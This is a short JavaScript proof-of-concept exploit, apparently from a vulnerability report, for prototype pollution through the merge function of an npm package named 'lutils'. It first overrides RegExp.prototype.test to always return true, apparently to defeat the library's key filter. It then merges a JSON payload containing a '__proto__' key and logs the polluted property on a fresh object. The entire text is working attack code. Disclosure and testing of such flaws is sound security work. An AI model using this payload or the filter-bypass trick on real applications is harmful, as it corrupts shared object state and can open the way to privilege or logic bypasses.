RegExp.prototype.test = () => true;
const lt = require('lutils');
let obj = {};
console.log({}.polluted);
let EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
lt.merge({}, EVIL_JSON);
console.log({}.polluted);